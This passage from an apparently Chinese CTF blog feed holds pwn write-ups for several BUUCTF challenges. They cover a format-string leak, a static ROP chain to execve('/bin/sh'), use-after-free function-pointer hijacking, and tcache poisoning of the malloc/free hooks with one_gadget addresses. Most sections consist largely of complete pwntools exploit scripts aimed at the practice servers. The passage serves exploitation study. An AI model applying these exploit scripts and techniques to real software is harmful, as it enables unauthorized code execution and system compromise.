alt></p><p>由于栈随机化，其中需要用格式化字符串漏洞泄漏<code>[ebp-0x4]</code>，来获取在<br>ebp-0x4的位置填入什么值合适，从而完成攻击。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./qiandao'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10013</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()one = <span class="hljs-number">0x804857D</span><span class="hljs-comment"># debug()</span>payload = <span class="hljs-string">'%13$p'</span>sla(<span class="hljs-string">'name'</span>,payload)ru(<span class="hljs-string">'0x'</span>)key = int(r(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x40</span> + <span class="hljs-number">0x8</span>info_addr(<span class="hljs-string">'key'</span>,key)payload = p32(one)*<span class="hljs-number">9</span> + p32(key)sla(<span class="hljs-string">"?"</span>,payload)itr()</code></pre></div><p>多调试，会更容易理解。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF暑假刷题(1)</title>
    <link href="/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/"/>
    <url>/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF暑假刷题-1"><a href="#BUUCTF暑假刷题-1" class="headerlink" title="BUUCTF暑假刷题(1)"></a>BUUCTF暑假刷题(1)</h1><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>静态链接。32位程序。用<code>int 80h</code> 这个中断调用，呼叫系统调用程序<code>system_call()</code>.。</p><p>然后rop 控制EAX = 0Xb = 11，EBX = &amp;(“/bin/sh”), ECX = EDX = 0，即执行了<code>sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)</code>，即可拿到shell。</p><p>32位系统调用表：<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./simplerop'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29124</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()offset = <span class="hljs-number">32</span>start = <span class="hljs-number">0x8048E45</span>read = <span class="hljs-number">0x806CD50</span>pop_eax_ret = <span class="hljs-number">0x080bae06</span>pop_ebx_ret = <span class="hljs-number">0x080481c9</span>pop_ecx_ebx_ret = <span class="hljs-number">0x0806e851</span>pop_edx_ret = <span class="hljs-number">0x0806e82a</span>pop3_ret = <span class="hljs-number">0x08048913</span>bss = <span class="hljs-number">0x80EC2EC</span> - <span class="hljs-number">0x10</span>ret = <span class="hljs-number">0x8048E6F</span>in_t_0x80 = <span class="hljs-number">0x080493e1</span>payload = <span class="hljs-string">'a'</span> * offset + flat([read,pop3_ret,<span class="hljs-number">0</span>,bss,<span class="hljs-number">0x8</span>])payload += flat([pop_eax_ret,<span class="hljs-number">11</span>,pop_ecx_ebx_ret,<span class="hljs-number">0</span>,bss,pop_edx_ret,<span class="hljs-number">0</span>,in_t_0x80])sa(<span class="hljs-string">':'</span>,payload)s(<span class="hljs-string">'/bin/sh\x00'</span>)itr()</code></pre></div><p>其中rop链read后返回地址：<code>pop3_ret</code>，是为了pop <code>0,bss,0x8</code>，然后再跟着rop。</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a><code>ciscn_2019_n_3</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">rec_str_free</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span>&#123;  <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)ptr + <span class="hljs-number">2</span>));  <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note freed!"</span>);&#125;</code></pre></div><p>每创建一个堆，就有一个0x10的堆空间，存放函数指针。一看到这个，就可以说是暗示攻击这个地方来劫持程序流程。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_del</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span>  v0 = ask((<span class="hljs-keyword">int</span>)<span class="hljs-string">"Index"</span>);  <span class="hljs-keyword">return</span> (*(<span class="hljs-keyword">int</span> (__cdecl **)(<span class="hljs-keyword">int</span>))(records[v0] + <span class="hljs-number">4</span>))(records[v0]);&#125;</code></pre></div><p>利用这个函数来劫持程序流程。<br>先<code>new(0,2,0x40,payload)</code>看一下程序的内存情况, 对于其中的<code>(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0])</code> ：</p><div class="hljs"><pre><code class="hljs c">gef➤  p &amp;records$<span class="hljs-number">1</span> = (&lt;data variable, no debug info&gt; *) <span class="hljs-number">0x804b080</span> &lt;records&gt;gef➤  x/wx <span class="hljs-number">0x804b080</span><span class="hljs-number">0x804b080</span> &lt;records&gt;:    <span class="hljs-number">0x08635160</span>gef➤  x/wx <span class="hljs-number">0x08635160</span><span class="hljs-number">0x8635160</span>:      <span class="hljs-number">0x080486de</span></code></pre></div><p>所以 <code>records[v0]</code>  = 0x08635160 </p><div class="hljs"><pre><code class="hljs c">gef➤  x/wx <span class="hljs-number">0x08635160</span>+<span class="hljs-number">4</span><span class="hljs-number">0x8635164</span>:      <span class="hljs-number">0x08048725</span>gef➤  x/i <span class="hljs-number">0x08048725</span>   <span class="hljs-number">0x8048725</span> &lt;rec_str_free&gt;:    push   ebp</code></pre></div><p>所以 <code>*(int (__cdecl **)(int))(records[v0] + 4))</code>  = <code>0x8048725 &lt;rec_str_free&gt;:</code></p><p>且<br><img src="http://qiqianyun.chumen77.xyz/uPic/VT03Ns.png" srcset="/img/loading.gif" alt><br>如图，把这里的函数指针控制成<code>sh\x00\00</code> + <code>&amp;system</code> ,即执行<code>do_del</code>时，运行的就是<code>system(sh)</code>可拿到shell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_n_3'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26453</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span><span class="hljs-params">(id,type,len,context)</span>:</span>    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))    sla(<span class="hljs-string">"Type &gt;"</span>,str(type))    sla(<span class="hljs-string">"th &gt;"</span>,str(len))    sa(<span class="hljs-string">"ue &gt;"</span>,str(context))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))payload = <span class="hljs-string">"a"</span> + <span class="hljs-string">'\n'</span>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)system = elf.plt[<span class="hljs-string">'system'</span>]new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x9</span>,<span class="hljs-string">'sh\x00\x00'</span>+ p32(system))free(<span class="hljs-number">1</span>)itr()</code></pre></div><h4 id="无system函数情况下"><a href="#无system函数情况下" class="headerlink" title="无system函数情况下"></a>无system函数情况下</h4><p>Leak libc，还是攻击那一个函数指针，本地通远程没通。</p><p>在测试的时候，由于fgets总是在你传入的字符串后加上<code>\x00</code>，曾经就遇到<br>过，导致泄漏十分难进行，但是发现：</p><div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">''</span>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x0</span>,payload)ru(<span class="hljs-string">"lue="</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d89d8</span></code></pre></div><p>传入空字节竟然可以通过，且没有加上<code>\x00</code>，从而不影响泄漏libc。还不知道是否以后遇到fgets函数就可以这样处理其影响，先挖个坑，记录着。</p><div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">'a'</span> + <span class="hljs-string">'\n'</span>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,payload)new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,payload)free(<span class="hljs-number">0</span>)payload = <span class="hljs-string">''</span>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x0</span>,payload)ru(<span class="hljs-string">"lue="</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d89d8</span>info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">4</span> + <span class="hljs-string">'/bin/sh\x00'</span> +<span class="hljs-string">'\n'</span>new(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span><span class="hljs-number">-0x10</span><span class="hljs-number">-0x10</span>,payload)new(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)new(<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">4</span>)rec = libc_base + <span class="hljs-number">0x3d123</span>new(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x9</span>,p32(rec) + p32(rec))<span class="hljs-comment"># free(5)</span>show(<span class="hljs-number">5</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="V-amp-N2020easyTHeap"><a href="#V-amp-N2020easyTHeap" class="headerlink" title="V&amp;N2020easyTHeap"></a>V&amp;N2020easyTHeap</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞，tcache dup攻击。</p><p>考点：</p><ul><li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li><li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3></li></ul><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./vn_pwn_easyTHeap'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>remote_libc = <span class="hljs-string">'./libc-2.27.so'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25814</span>)    libc = ELF(remote_libc)elf = ELF(local_file)<span class="hljs-comment"># libc = elf.libc</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">"choice"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">"?"</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,context)</span>:</span>    sla(<span class="hljs-string">"choice"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'content'</span>,str(context))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">"idx"</span>,str(idx))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()heapbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x260</span>info_addr(<span class="hljs-string">'heapbase'</span>,heapbase)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span>edit(<span class="hljs-number">2</span>,p64(heapbase+<span class="hljs-number">0x10</span>))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#4</span>edit(<span class="hljs-number">4</span>,<span class="hljs-string">'\x07'</span>*<span class="hljs-number">0x10</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)__malloc_hook = libc_base + <span class="hljs-number">0x3ebc30</span>__realloc_hook = __malloc_hook <span class="hljs-number">-0x8</span>payload = <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">8</span>+<span class="hljs-number">7</span>) + <span class="hljs-string">'\x01'</span> + <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x38</span> + p64(__realloc_hook)edit(<span class="hljs-number">4</span>,payload)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span>onerec = <span class="hljs-number">0x10a38c</span> + libc_baserealloc_addr = libc_base + libc.symbols[<span class="hljs-string">'__libc_realloc'</span>]info_addr(<span class="hljs-string">'relloc'</span>,realloc_addr)info_addr(<span class="hljs-string">'__malloc_hook'</span>,__malloc_hook)payload = p64(onerec) + p64(realloc_addr+<span class="hljs-number">8</span>)edit(<span class="hljs-number">5</span>,payload)add(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#debug()</span>itr()</code></pre></div><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><code>ciscn_2019_final_3</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18，保护全开，存在uaf漏洞。</p><p>程序只有增加和删除的功能，但是增加一个堆块后回给你返回申请堆块的地址信息。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"gift :%p\n"</span>, heaplist[HIDWORD(size)]);</code></pre></div><p>删除堆后，没有置0的操作，存在uaf。</p><p>考点：</p><ul><li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li><li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。</li></ul><p>难点：</p><ul><li>泄漏libc地址</li><li>精巧的构造一个任意地址写（在<code>tcache struct</code>处折腾）</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *import timelocal_file  = './ciscn_final_3'local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'remote_libc = local_libc # './libc.so.6'context.log_level = 'debug'debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote('node3.buuoj.cn',27714)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = ['tmux','neww']rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()def add(idx,size,content):    sla("&gt;",'1')    sla('index',str(idx))    sla('size',str(size))    sa('thing',str(content))    ru("0x")    gift = int(r(12),16)    info_addr('gift',gift)    return giftdef free(idx):    sla("&gt;",'2')    sla("index",str(idx))heap_base = add(0,0x48,'a') - 0x11e70free(0)free(0)add(1,0x48,p64(heap_base+0x10))add(2,0x48,p64(heap_base+0x10))payload = 0x30 * '\x07'add(3,0x48,payload)free(3)payload = 0x30 * '\x00'add(4,0x48,payload)add(5,0x10,' ')libc_base = add(6,0x78,' ') - 0x3ebca0info_addr('libc_base',libc_base)free_hook = libc_base + 0x3ed8e8free(5)add(7,0x10,p64(free_hook)*2)one_rec = 0x4f322 + libc_baseadd(8,0x48,p64(one_rec))# debug()free(4)itr()</code></pre></div><p>调试一下就懂了。其中0x10那个堆块的申请很重要，正好可以供后面的使用。</p><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>只是一个简单的rop，考的就是32位下如何控制传参数。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./PicoCTF_2018_rop_chain'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29550</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>] <span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = []realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># 